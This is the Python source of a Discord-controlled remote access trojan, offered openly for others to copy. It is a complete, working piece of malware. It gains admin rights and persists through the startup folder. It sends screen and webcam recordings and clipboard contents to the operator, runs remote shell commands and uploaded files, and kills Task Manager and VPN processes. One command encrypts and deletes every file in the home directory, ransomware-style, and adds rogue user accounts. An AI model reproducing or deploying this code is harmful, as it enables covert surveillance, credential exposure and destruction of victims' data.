### This is a discontinued RAT.
### You can skid from this code, but I will not provide support.
### If something does not work, it is your problem.



























import discord
from discord.ext import commands, tasks
from discord.ui import Button, View
import pyautogui
import io
import asyncio
import os
import tempfile
import requests
import subprocess
import sys
import zipfile
import shutil
import datetime
import psutil
import pyperclip
import cv2
import webbrowser
import shlex
import cryptography
from cryptography.fernet import Fernet
import time
import platform
import ctypes
import numpy as np
from threading import Thread
import win32com.client
from ping3 import ping
import mss
import mss.tools
from PIL import ImageGrab, Image, ImageDraw, ImageFont, ImageWin
import win32print
import win32ui

theme_color = discord.Color.yellow()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        script = sys.argv[0]
        params = ' '.join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        sys.exit(0)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

CHANNEL_ID = id
TASK_RUN = id
keylogging_active = False
key_log = []
monitoring = False
connected_users = []

DESIRED_FOLDER = os.path.join(os.getcwd(), 'WINREG')
os.makedirs(DESIRED_FOLDER, exist_ok=True)

recording = False
video_path = "output.avi"
zip_path = "output.zip"

def screen_record():
    global recording
    while recording:

        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter(video_path, fourcc, 8.0, (pyautogui.size()))

        start_time = time.time()
        while time.time() - start_time < 120:  
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            if not recording:
                break
        out.release()

        create_zip()

        send_video()

        os.remove(video_path)

        time.sleep(120)

def create_zip():
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        zipf.write(video_path, os.path.basename(video_path))

def send_video():
    guild = discord.utils.get(bot.guilds, name="(No Diddy) Hecker Funny")
    channel = discord.utils.get(guild.text_channels, name="recordings")
    if channel:
        bot.loop.create_task(channel.send(file=discord.File(zip_path)))

@bot.command()
async def screenrecord(ctx, action: str):
    global recording
    if action == "on" and not recording:
        recording = True
        thread = Thread(target=screen_record)
        thread.start()
        await ctx.send("Screen recording started.")
    elif action == "off" and recording:
        recording = False
        await ctx.send("Screen recording stopped and video sent.")
    else:
        await ctx.send("Invalid action or recording is already in the specified state.")

def get_platform():
    platforms = {
        'linux': 'Linux',
        'linux2': 'Linux',
        'darwin': 'macOS',
        'win32': 'Windows',
        'cygwin': 'Windows'
    }
    return platforms.get(sys.platform, 'Unknown')

def run_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        return result.stdout
    except Exception as e:
        return str(e)

@bot.event
async def on_ready():
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        computer_name = get_computer_name()
        ip_address = get_ip_address()
        await channel.send(f'Bot is online!\nComputer Name: {computer_name}\nIP Address: {ip_address}')

@bot.command(name='killtask')
async def killtask(ctx, state: str):
    global monitoring
    if state.lower() == 'on':
        if monitoring:
            await ctx.send('Task Manager monitoring is already enabled.')
        else:
            monitoring = True
            check_task_manager.start()
            await ctx.send('Task Manager monitoring started.')
    elif state.lower() == 'off':
        if not monitoring:
            await ctx.send('Task Manager monitoring is not enabled.')
        else:
            monitoring = False
            check_task_manager.stop()
            await ctx.send('Task Manager monitoring stopped.')
    else:
        await ctx.send('Invalid state. Use "on" or "off".')

@tasks.loop(seconds=0.5)
async def check_task_manager():
    if monitoring:
        result = run_command('tasklist' if get_platform() == 'Windows' else 'ps -A')
        if 'Taskmgr.exe' in result:
            user = bot.get_user(TASK_RUN)
            if user:
                await user.send('Task Manager is currently open!')
            run_command('taskkill /F /IM Taskmgr.exe' if get_platform() == 'Windows' else 'pkill taskmgr')

@bot.command(name='visit')
async def visit(ctx, url: str):
    webbrowser.open(url)
    await ctx.send(f'Visited {url}!')

@bot.command(name='ddos')
async def ddos(ctx, address: str):
    try:
        response = ping(address)
        ip_response = requests.get('https://api.ipify.org?format=json')
        ip_address = ip_response.json().get('ip', 'unknown IP')
        if response is None:
            await ctx.send(f'Ping failed from: {ip_address}')
        else:
            await ctx.send(f'Ping to {address} succeeded from: {ip_address} - Response time: {response * 1000:.2f} ms')
    except Exception as e:
        await ctx.send(f'Error pinging {address}: {str(e)}')

@bot.command(name='scare')
async def scare(ctx, *, text: str):
    try:
        file_path = os.path.join(DESIRED_FOLDER, 'scare_message.txt')
        with open(file_path, 'w') as f:
            f.write(text)
        if get_platform() == 'Windows':
            os.startfile(file_path)
        elif get_platform() == 'macOS':
            subprocess.call(['open', file_path])
        else:
            subprocess.call(['xdg-open', file_path])
        await ctx.send('Text file created and opened!')
    except Exception as e:
        await ctx.send(f'Error creating or opening text file: {str(e)}')

@bot.command(name='ip')
async def get_ip(ctx):
    try:
        ip_response = requests.get('https://api.ipify.org?format=json')
        ip_address = ip_response.json().get('ip', 'unknown IP')
        file_path = os.path.join(DESIRED_FOLDER, 'ips.txt')
        with open(file_path, 'w') as f:
            f.write(f'IP: {ip_address}\n')
        await ctx.send(file=discord.File(file_path))
        os.remove(file_path)
    except Exception as e:
        await ctx.send(f'Error retrieving IP address: {str(e)}')

@bot.command(name='shutdown')
async def shutdown(ctx):
    try:
        if get_platform() == 'Windows':
            run_command('shutdown /s /t 0')
        elif get_platform() == 'macOS':
            run_command('sudo shutdown -h now')
        else:
            run_command('sudo shutdown -h now')
        await ctx.send('PC is shutting down.')
    except Exception as e:
        await ctx.send(f'Error shutting down PC: {str(e)}')

@bot.command(name='restart')
async def restart(ctx):
    try:
        if get_platform() == 'Windows':
            run_command('shutdown /r /t 0')
        elif get_platform() == 'macOS':
            run_command('sudo shutdown -r now')
        else:
            run_command('sudo reboot')
        await ctx.send('PC is restarting.')
    except Exception as e:
        await ctx.send(f'Error restarting PC: {str(e)}')

@bot.command(name='run')
async def run(ctx, filename: str):
    file_path = os.path.join(DESIRED_FOLDER, filename)
    if not os.path.isfile(file_path):
        await ctx.send(f'File not found: {filename}')
        return
    try:
        run_command(file_path)
        await ctx.send(f'File {filename} executed successfully.')
    except Exception as e:
        await ctx.send(f'Error executing file: {str(e)}')

@bot.command(name='install')
async def install(ctx, filename: str = None):
    if not ctx.message.attachments:
        await ctx.send('No file attached.')
        return
    attachment = ctx.message.attachments[0]
    file_path = os.path.join(DESIRED_FOLDER, filename or attachment.filename)
    try:
        await attachment.save(file_path)
        if zipfile.is_zipfile(file_path):
            extract_path = os.path.join(DESIRED_FOLDER, 'extracted')
            os.makedirs(extract_path, exist_ok=True)
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(extract_path)
            await ctx.send(f'Zip file extracted to {extract_path}.')
        else:
            await ctx.send(f'File {attachment.filename} saved to desired folder.')
    except Exception as e:
        await ctx.send(f'Error saving file: {str(e)}')

@bot.command(name='ss')
async def screenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        file_path = os.path.join(DESIRED_FOLDER, 'screenshot.png')
        screenshot.save(file_path)
        await ctx.send(file=discord.File(file_path))
        os.remove(file_path)
    except Exception as e:
        await ctx.send(f'Error taking screenshot: {str(e)}')

@bot.command(name='fuckvpns')
async def fuckvpn(ctx):
    try:
        vpns = [
            'NordVPN', 'ProtonVPN', 'ExpressVPN', 'CyberGhost', 'Private Internet Access', 'Surfshark', 'TunnelBear',
            'Windscribe', 'Hotspot Shield', 'VyprVPN'
        ]
        for vpn in vpns:
            run_command(f'taskkill /IM {vpn}.exe /F' if get_platform() == 'Windows' else f'pkill {vpn}')
        await ctx.send('VPN processes terminated.')
    except Exception as e:
        await ctx.send(f'Error terminating VPN processes: {str(e)}')

@bot.command(name='killfile')
async def kill(ctx, filename: str = None):
    if not ctx.message.attachments:
        await ctx.send('No file attached.')
        return
    attachment = ctx.message.attachments[0]
    file_path = os.path.join(DESIRED_FOLDER, filename or attachment.filename)
    try:
        await attachment.save(file_path)
        run_command(file_path)
        os.remove(file_path)
        await ctx.send(f'File {attachment.filename} executed and deleted successfully.')
    except Exception as e:
        await ctx.send(f'Error executing and deleting file: {str(e)}')

@bot.command(name='extract')
async def extract(ctx, filename: str = None):
    if not ctx.message.attachments:
        await ctx.send('No zip file attached.')
        return
    attachment = ctx.message.attachments[0]
    zip_path = os.path.join(DESIRED_FOLDER, filename or attachment.filename)
    try:
        await attachment.save(zip_path)
        if zipfile.is_zipfile(zip_path):
            extract_path = os.path.join(DESIRED_FOLDER, f'extracted_{filename or attachment.filename}')
            os.makedirs(extract_path, exist_ok=True)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_path)
            await ctx.send(f'Zip file extracted to {extract_path}.')
        else:
            await ctx.send(f'{zip_path} is not a valid zip file.')
    except Exception as e:
        await ctx.send(f'Error extracting zip file: {str(e)}')

@bot.command(name='folder')
async def folder(ctx, folder_name: str):
    try:
        folder_path = os.path.join(DESIRED_FOLDER, folder_name)
        if os.path.isdir(folder_path):
            folder_size = sum(os.path.getsize(os.path.join(folder_path, f)) for f in os.listdir(folder_path))
            await ctx.send(f'Folder "{folder_name}" has a size of {folder_size / 1024:.2f} KB.')
        else:
            await ctx.send(f'Folder "{folder_name}" does not exist.')
    except Exception as e:
        await ctx.send(f'Error accessing folder: {str(e)}')

@bot.command(name='webcam')
async def webcam(ctx):
    try:
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        file_path = os.path.join(DESIRED_FOLDER, 'webcam_capture.png')
        cv2.imwrite(file_path, frame)
        camera.release()
        await ctx.send(file=discord.File(file_path))
        os.remove(file_path)
    except Exception as e:
        await ctx.send(f'Error capturing webcam image: {str(e)}')

@bot.command(name='encrypt')
async def encrypt(ctx, filename: str):
    if not os.path.isfile(filename):
        await ctx.send(f'File not found: {filename}')
        return
    try:
        key = Fernet.generate_key()
        cipher = Fernet(key)
        with open(filename, 'rb') as file:
            data = file.read()
        encrypted_data = cipher.encrypt(data)
        encrypted_file_path = filename + '.enc'
        with open(encrypted_file_path, 'wb') as file:
            file.write(encrypted_data)
        await ctx.send(f'File encrypted as {encrypted_file_path}.')
    except Exception as e:
        await ctx.send(f'Error encrypting file: {str(e)}')

@bot.command(name='selfdestruct')
async def selfdestruct(ctx):
    await ctx.send('Bot is self-destructing...')
    for file in os.listdir():
        if file.endswith('.py'):
            os.remove(file)
    await ctx.send('Bot files deleted.')

@bot.command(name='stress')
async def stress(ctx, duration: int):
    await ctx.send(f'Stressing system for {duration} seconds...')
    start_time = time.time()
    while time.time() - start_time < duration:
        _ = [x**2 for x in range(10000)]
    await ctx.send('Stress test completed.')

@bot.command(name='rickroll')
async def rickroll(ctx, amount: int):
    url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
    for _ in range(amount):
        webbrowser.open(url)
    await ctx.send(f'Opened Rickroll link {amount} times!')

@bot.command(name='massopen')
async def massopen(ctx, amount: int, url: str):
    try:
        for _ in range(amount):
            webbrowser.open(url)
        await ctx.send(f'Opened {url} {amount} times!')
    except Exception as e:
        await ctx.send(f'Error opening URL: {str(e)}')

@bot.command(name='info')
async def info(ctx):
    message = await ctx.send('What information would you like to receive? React with the corresponding emoji:\n'
                             '🪙 - Discord tokens\n'
                             '🔑 - Passwords\n'
                             '🌐 - Browser History')

    await message.add_reaction('🪙')
    await message.add_reaction('🔑')
    await message.add_reaction('🌐')

    def check(reaction, user):
        return user == ctx.author and reaction.message.id == message.id and str(reaction.emoji) in ['🪙', '🔑', '🌐']

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)

        if str(reaction.emoji) == '🪙':
            await ctx.send('Discord tokens will be provided soon.')
        elif str(reaction.emoji) == '🔑':
            await ctx.send('Passwords will be provided soon.')
        elif str(reaction.emoji) == '🌐':
            await ctx.send('Browser History will be provided soon.')

    except asyncio.TimeoutError:
        await ctx.send('You did not react in time.')

@bot.command(name='massfile')
async def massfile(ctx, amount: int, location: str, name: str):
    try:

        folder_path = os.path.join(os.path.expanduser(f'~/{location}'))
        os.makedirs(folder_path, exist_ok=True)

        for i in range(amount):
            file_path = os.path.join(folder_path, f'{name}_{i}.txt')
            with open(file_path, 'w') as file:
                file.write(f'This is file number {i}')

        await ctx.send(f'Created {amount} files named "{name}" in the "{location}" folder.')
    except Exception as e:
        await ctx.send(f'Error creating files: {str(e)}')

@bot.command(name='massfolder')
async def massfolder(ctx, amount: int, location: str, name: str):
    try:

        parent_folder_path = os.path.join(os.path.expanduser(f'~/{location}'))
        os.makedirs(parent_folder_path, exist_ok=True)

        for i in range(amount):
            folder_path = os.path.join(parent_folder_path, f'{name}_{i}')
            os.makedirs(folder_path, exist_ok=True)

        await ctx.send(f'Created {amount} folders named "{name}" in the "{location}" folder.')
    except Exception as e:
        await ctx.send(f'Error creating folders: {str(e)}')

@bot.command(name='killall')
async def killall(ctx):
    try:
        current_pid = os.getpid()
        for process in psutil.process_iter(['pid', 'name']):
            try:
                if process.info['pid'] != current_pid:
                    if platform.system() == 'Windows':
                        os.system(f'taskkill /PID {process.info["pid"]} /F')
                    else:
                        os.system(f'kill -9 {process.info["pid"]}')
            except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                continue

        await ctx.send('Attempted to terminate all processes except the bot.')
    except Exception as e:
        await ctx.send(f'Error terminating processes: {str(e)}')

@bot.command(name='loopddos')
async def loopddos(ctx, address: str):
    try:
        while True:
            response = ping(address)
            ip_response = requests.get('https://api.ipify.org?format=json')
            ip_address = ip_response.json().get('ip', 'unknown IP')
            if response is None:
                await ctx.send(f'Ping failed from: {ip_address}')
            else:
                await ctx.send(f'Ping to {address} succeeded from: {ip_address} - Response time: {response * 1000:.2f} ms')
            await asyncio.sleep(10)  
    except Exception as e:
        await ctx.send(f'Error pinging {address}: {str(e)}')

@bot.command(name='loopkill')
async def loopkill(ctx, filename: str):
    try:
        while True:
            for process in psutil.process_iter(['pid', 'name']):
                try:
                    if filename in process.info['name']:
                        if platform.system() == 'Windows':
                            os.system(f'taskkill /PID {process.info["pid"]} /F')
                        else:
                            os.system(f'kill -9 {process.info["pid"]}')
                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                    continue

            await ctx.send(f'Attempting to kill all instances of {filename} continuously.')
            await asyncio.sleep(5)  

    except Exception as e:
        await ctx.send(f'Error terminating processes: {str(e)}')

@bot.command(name='loopkillall')
async def loopkillall(ctx):
    try:
        while True:
            current_pid = os.getpid()
            for process in psutil.process_iter(['pid', 'name']):
                try:
                    if process.info['pid'] != current_pid:
                        if platform.system() == 'Windows':
                            os.system(f'taskkill /PID {process.info["pid"]} /F')
                        else:
                            os.system(f'kill -9 {process.info["pid"]}')
                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                    continue

            await ctx.send('Attempting to kill all processes continuously except the bot.')
            await asyncio.sleep(5)  

    except Exception as e:
        await ctx.send(f'Error terminating processes: {str(e)}')

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):

    if amount <= 0:
        embed = discord.Embed(
            title="Invalid Amount",
            description="Please provide a number greater than 0.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=5)
        return

    if amount > 100:
        amount = 100

    try:
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title="Purged",
            description=f"Deleted {len(deleted)} messages successfully.",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed, delete_after=5)
    except discord.Forbidden:
        embed = discord.Embed(
            title="Permission Denied",
            description="I don't have permission to manage messages.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=5)
    except discord.HTTPException as e:
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=5)

@bot.command(name='weball')
async def weball(ctx):
    try:

        for i in range(10):
            run_command(f'adduser LMMA{i} --password P@ssw0rd')

        for root, dirs, files in os.walk(os.path.expanduser("~")):
            for i in range(100):
                file_path = os.path.join(root, f'TxB_{i}.txt')
                with open(file_path, 'w') as f:
                    f.write(f'This is file number {i}')

        for root, dirs, files in os.walk(os.path.expanduser("~")):
            for file in files:
                file_path = os.path.join(root, file)
                if not file_path.endswith('.enc'):
                    key = Fernet.generate_key()
                    cipher = Fernet(key)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = cipher.encrypt(data)
                    encrypted_file_path = file_path + '.enc'
                    with open(encrypted_file_path, 'wb') as f:
                        f.write(encrypted_data)
                    os.remove(file_path)  

        for _ in range(100):
            webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
            await asyncio.sleep(1)  

        if get_platform() == 'Windows':
            run_command('shutdown /r /t 0')
        elif get_platform() == 'macOS':
            run_command('sudo shutdown -r now')
        else:
            run_command('sudo reboot')

    except Exception as e:
        pass

def add_to_startup(script_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shortcut_path = os.path.join(startup_folder, 'MyScript.lnk')

    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = script_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.save()

script_path = os.path.abspath(__file__)
add_to_startup(script_path)

@bot.command()
async def reccam(ctx, action: str):
    if action.lower() == "on":
        await ctx.send("Starting webcam recording.")
        bot.loop.create_task(record_webcam(ctx))
    elif action.lower() == "off":
        await ctx.send("Stopping webcam recording.")
        global recording
        recording = False
    else:
        await ctx.send("Invalid action. Use 'on' or 'off'.")

async def record_webcam(ctx):
    global recording
    recording = True
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    while recording:
        out_file = os.path.join(tempfile.gettempdir(), f"webcam_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.avi")
        out = cv2.VideoWriter(out_file, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while time.time() - start_time < 120 and recording:  
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            await asyncio.sleep(0.05)
        out.release()
        await ctx.send(file=discord.File(out_file))
    cap.release()
    cv2.destroyAllWindows()

@bot.command(name='clipboard')
async def clipboard(ctx):
    """Send the current clipboard content."""
    try:
        text = pyperclip.paste()
        await ctx.send(f'Clipboard content: {text}')
    except Exception as e:
        await ctx.send(f'Error retrieving clipboard content: {str(e)}')

@bot.command(name='setclipboard')
async def setclipboard(ctx, *, text: str):
    """Set the clipboard content to the specified text."""
    try:
        pyperclip.copy(text)
        await ctx.send(f'Clipboard content set to: {text}')
    except Exception as e:
        await ctx.send(f'Error setting clipboard content: {str(e)}')

def get_computer_name():
    return platform.node()

def get_ip_address():
    try:
        ip_response = requests.get('https://api.ipify.org?format=json')
        return ip_response.json().get('ip', 'unknown IP')
    except requests.RequestException:
        return 'unknown IP'

@tasks.loop(seconds=0.5)
async def check_task_manager():
    if monitoring:
        result = run_command('tasklist' if get_platform() == 'Windows' else 'ps -A')
        if 'Taskmgr.exe' in result:
            user = bot.get_user(TASK_RUN)
            if user:
                await user.send('Task Manager is currently open! Restarting PC...')

            if get_platform() == 'Windows':
                run_command('shutdown /r /t 0')  
            elif get_platform() == 'macOS':
                run_command('sudo shutdown -r now')  
            else:
                run_command('sudo reboot')  

@bot.command()
async def ls(ctx):
    global processes_list
    processes_list = []  
    for proc in psutil.process_iter(['name', 'pid', 'num_threads']):
        name = proc.info['name']
        pid = proc.info['pid']
        threads = proc.info['num_threads']

        if threads > 1:
            processes_list.append((name, pid, threads))
        else:
            processes_list.append((name, pid))

    process_output = "\n".join([f"{i + 1}. {proc[0]} ({proc[2]})" if len(proc) > 2 else f"{i + 1}. {proc[0]}" for i, proc in enumerate(processes_list)])
    await ctx.send(f"```\n{process_output}\n```")

screenshot_status = {}
CHANNEL_ID2 = 1285379234096746498
@bot.command()
async def takess(ctx, status: str):
    if status.lower() not in ['on', 'off']:
        await ctx.send("Invalid status. Please use 'on' or 'off'.")
        return

    screenshot_status[ctx.guild.id] = status.lower()

    if status.lower() == 'on':
        await ctx.send("Screenshot capture is now ON.")
        while screenshot_status.get(ctx.guild.id) == 'on':

            screenshot = ImageGrab.grab()  
            timestamp = int(time.time())

            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            buffer.seek(0)

            channel = bot.get_channel(CHANNEL_ID2)
            if channel:
                await channel.send(file=discord.File(fp=buffer, filename=f"screenshot_{timestamp}.png"))
            else:
                print(f"Channel with ID {CHANNEL_ID2} not found.")

            time.sleep(5)  
    else:
        await ctx.send("Screenshot capture is now OFF.")

@bot.command()
async def killnum(ctx, identifier: str):
    global processes_list
    if identifier.isdigit():

        process_num = int(identifier) - 1
        if 0 <= process_num < len(processes_list):
            proc = processes_list[process_num]
            pid = proc[1]
            try:
                psutil.Process(pid).terminate()  
                await ctx.send(f"Process {proc[0]} (PID: {pid}) has been terminated.")
            except psutil.NoSuchProcess:
                await ctx.send("Process not found or already terminated.")
        else:
            await ctx.send("Invalid process number.")
    else:

        killed_any = False
        for proc in processes_list:
            if identifier.lower() in proc[0].lower():
                try:
                    psutil.Process(proc[1]).terminate()  
                    await ctx.send(f"Process {proc[0]} (PID: {proc[1]}) has been terminated.")
                    killed_any = True
                except psutil.NoSuchProcess:
                    await ctx.send(f"Process {proc[0]} not found or already terminated.")

        if not killed_any:
            await ctx.send("No matching process found.")

@bot.command()
async def print(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach an image to print.")
        return

    attachment = ctx.message.attachments[0]

    image_bytes = await attachment.read()

    try:

        image = Image.open(io.BytesIO(image_bytes))

        max_width = 2100  
        max_height = 2970  
        image.thumbnail((max_width, max_height))

        printer_name = win32print.GetDefaultPrinter()
        hprinter = win32print.OpenPrinter(printer_name)
        hdc = win32ui.CreateDC()
        hdc.CreatePrinterDC(printer_name)
        hdc.StartDoc("Discord Print Job")
        hdc.StartPage()

        dib = ImageWin.Dib(image)
        hdc.SetMapMode(win32ui.MM_TWIPS)
        dib.draw(hdc.GetHandleOutput(), (0, 0, image.width, image.height))

        hdc.EndPage()
        hdc.EndDoc()
        hdc.DeleteDC()

        await ctx.send("Image sent to printer.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def msgprint(ctx, *, message: str):
    if not message:
        await ctx.send("Please provide a message to print.")
        return

    try:

        image_width = 800
        image_height = 200
        background_color = (255, 255, 255)  
        text_color = (0, 0, 0)  

        try:
            font = ImageFont.truetype("arial.ttf", 400)  
        except IOError:
            font = ImageFont.load_default()  

        image = Image.new('RGB', (image_width, image_height), color=background_color)
        draw = ImageDraw.Draw(image)

        bbox = draw.textbbox((0, 0), message, font=font)
        text_width = bbox[2] - bbox[0]
        text_height = bbox[3] - bbox[1]
        text_x = (image_width - text_width) / 2
        text_y = (image_height - text_height) / 2

        draw.text((text_x, text_y), message, font=font, fill=text_color)

        printer_name = win32print.GetDefaultPrinter()
        hprinter = win32print.OpenPrinter(printer_name)
        hdc = win32ui.CreateDC()
        hdc.CreatePrinterDC(printer_name)
        hdc.StartDoc("Discord Print Job")
        hdc.StartPage()

        dib = ImageWin.Dib(image)
        dib.draw(hdc.GetHandleOutput(), (0, 0, image_width, image_height))

        hdc.EndPage()
        hdc.EndDoc()
        hdc.DeleteDC()

        await ctx.send("Message sent to printer.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def elevate(ctx, status: str):
    global elevated
    if status.lower() == 'on':
        elevated = True
        await ctx.send('Elevated mode is now ON.')
    elif status.lower() == 'off':
        elevated = False
        await ctx.send('Elevated mode is now OFF.')
    else:
        await ctx.send('Invalid status. Use "on" or "off".')

@bot.command()
async def cmd(ctx, *, cmd: str):
    global elevated
    try:

        if 'elevated' not in globals():
            elevated = False

        if elevated:
            cmd = f'powershell -Command "Start-Process cmd -ArgumentList \'/c {cmd}\' -Verb RunAs'

        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr

        if output:
            await ctx.send(f'```\n{output}\n```')
        else:
            await ctx.send('No output.')

    except Exception as e:
        await ctx.send(f'An error occurred: {str(e)}')

def is_task_manager_running():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':  
            return True
    return False

def restart_pc():
    os.system("shutdown /r /t 0")  

if __name__ == "__main__":
    run_as_admin()
    bot.run('token')
    while True:
        if is_task_manager_running():
            restart_pc()
            sys.exit()
        time.sleep(0.5)